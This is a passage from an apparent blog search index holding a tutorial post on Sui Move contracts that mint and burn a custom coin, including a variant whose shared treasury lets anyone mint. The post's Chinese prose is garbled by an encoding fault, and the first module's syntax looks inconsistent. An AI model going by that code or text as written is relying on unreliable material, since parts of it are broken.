uploading\n\n![](https://raw.githubusercontent.com/DudeGuuud/dudeguuud.github.io/main/images/25/4/kali-red-sticker_95812a9edf3279ab16a5402fbbdbeb71.jpg)\n"},{"title":"0x2 Mint & Burn","url":"/2025/04/16/MoveTASK2/","content":"# 0x2 Mint & Burn\n\n## Publish Contract\n\n```rust\nmodule task2::my_coin;\n    use sui::coin::{Self, Coin, TreasuryCap};\n    use std::debug;\n    use std::ascii::string;\n//\n    public struct MY_COIN has drop {}\n\n    fun init(witness: MY_COIN, ctx: &mut TxContext) {\n        let (treasury, metadata) = coin::create_currency(\n            witness,\n            6,\n            b\"DUDE\",\n            b\"DUDE_COIN\",\n            b\"This is DudeGuuud Coin.\",\n            option::none(),\n            ctx);\n        debug::print(&string(b\"init MY_COIN\"));\n        transfer::public_freeze_object(metadata);\n        transfer::public_transfer(treasury, ctx.sender())\n    }\n\n    public entry fun mint(\n        treasury_cap: &mut TreasuryCap<MY_COIN>,\n        amount: u64,\n        recipient: address,\n        ctx: &mut TxContext,\n    ) {\n        debug::print(&string(b\"my_coin mint\"));\n        let coin = coin::mint(treasury_cap, amount, ctx);\n        transfer::public_transfer(coin, recipient)\n    }\n\n    public entry fun burn(\n        treasury_cap: &mut TreasuryCap<MY_COIN>,\n        coin: Coin<MY_COIN>\n    ) {\n        debug::print(&string(b\"burn\"));\n        coin::burn(treasury_cap, coin);\n    }\n}\n```\n\nå…¶ä¸»è¦å†…å®¹æ˜¯mintè‡ªå®šä¹‰ä»£å¸å’Œé”€æ¯ï¼Œå› ä¸ºtreasury_capå±äºç§æœ‰ï¼Œåªæœ‰æ‰€å±é’±åŒ…ï¼ˆç¬¬ä¸€æ¬¡publishè§è¯è€…è´¦æˆ·ï¼‰\n\n* åœ¨å½“å‰ä»£ç ä¸­ï¼Œ**TreasuryCap** åœ¨ **init** å‡½æ•°ä¸­é€šè¿‡ **transfer::public\\_transfer** è½¬ç§»åˆ° **ctx.sender()**ï¼ˆå‘å¸ƒè€…çš„åœ°å€ï¼‰ã€‚\n* è¿™æ„å‘³ç€åªæœ‰å‘å¸ƒè€…çš„åœ°å€ï¼ˆè§è¯è€…è´¦æˆ·ï¼‰æŒæœ‰ **TreasuryCap**ï¼Œå¯ä»¥è°ƒç”¨ **mint** å’Œ **burn**ã€‚\n* å…¶ä»–è´¦æˆ·æ— æ³•ç›´æ¥æ“ä½œï¼Œé™¤éå‘å¸ƒè€…æ˜¾å¼è½¬ç§» **TreasuryCap**ï¼ˆä¾‹å¦‚é€šè¿‡ **transfer::public\\_transfer**ï¼‰\n\nåŒæ—¶å¦‚æœéœ€è¦å…±äº«TreasuryCapçš„æƒé™\n\n```rust\nmodule task2::my_coin {\n    use sui::coin::{Self, Coin, TreasuryCap};\n    use sui::transfer;\n    use sui::tx_context::{Self, TxContext};\n    use sui::object::{Self, UID};\n    use sui::event;\n    use std::ascii::string;\n    use std::option;\n\n    // ä»£å¸ç»“æ„ä½“\n    public struct MY_COIN has drop {}\n\n    // å…±äº«å¯¹è±¡ï¼Œç”¨äºå­˜å‚¨ TreasuryCap\n    public struct SharedTreasury has key {\n        id: UID,\n        treasury: TreasuryCap<MY_COIN>,\n    }\n\n    // é“¸é€ äº‹ä»¶\n    public struct MintEvent has copy, drop {\n        amount: u64,\n        recipient: address,\n    }\n\n    // é”€æ¯äº‹ä»¶\n    public struct BurnEvent has copy, drop {\n        amount: u64,\n    }\n\n    // åˆå§‹åŒ–å‡½æ•°ï¼šåˆ›å»ºä»£å¸å¹¶å°† TreasuryCap æ”¾å…¥å…±äº«å¯¹è±¡\n    fun init(witness: MY_COIN, ctx: &mut TxContext) {\n        let (treasury, metadata) = coin::create_currency(\n            witness,\n            6,\n            b\"DUDE\",\n            b\"DUDE_COIN\",\n            b\"This is DudeGuuud Coin.\",\n            option::none(),\n            ctx\n        );\n        // å†»ç»“å…ƒæ•°æ®\n        transfer::public_freeze_object(metadata);\n        // åˆ›å»ºå…±äº«å¯¹è±¡å¹¶å­˜å‚¨ TreasuryCap\n        let shared_treasury = SharedTreasury {\n            id: object::new(ctx),\n            treasury,\n        };\n        transfer::share_object(shared_treasury);\n    }\n\n    // å…¬å…±é“¸é€ å‡½æ•°ï¼šä»»ä½•äººå¯è°ƒç”¨\n    public entry fun mint(\n        shared: &mut SharedTreasury,\n        amount: u64,\n        recipient: address,\n        ctx: &mut TxContext,\n    ) {\n        let coin = coin::mint(&mut shared.treasury, amount, ctx);\n        event::emit(MintEvent { amount, recipient });\n        transfer::public_transfer(coin, recipient);\n    }\n\n    // å…¬å…±é”€æ¯å‡½æ•°ï¼šä»»ä½•äººå¯è°ƒç”¨\n    public entry fun burn(\n        shared: &mut SharedTreasury,\n        coin: Coin<MY_COIN>\n    ) {\n        let amount = coin::value(&coin);\n        coin::burn(&mut shared.treasury, coin);\n        event::emit(BurnEvent { amount });\n    }\n}\n```\n\nå¦‚æœå°† **TreasuryCap** å­˜å‚¨åœ¨ä¸€ä¸ªå…±äº«å¯¹è±¡ï¼ˆ**SharedTreasury**ï¼‰ä¸­ï¼Œå…è®¸ä»»ä½•äººè°ƒç”¨ã€‚\næä¾›å…¬å…±å…¥å£å‡½æ•°ï¼ˆ**public entry fun**ï¼‰ï¼Œé€šè¿‡å…±äº«å¯¹è±¡é—´æ¥è®¿é—® **TreasuryCap**ï¼Œå› ä¸ºå…±äº«äº†æ‰€æœ‰æƒï¼Œ**Call** å°±å¯ä»¥äº†ï¼Œè¦æ±‚å¯¹æ‰€æœ‰æƒè¡¨ç¤ºæ•¬ç•ã€‚\n","tags":["Web3"],"categories":["Web3"]}]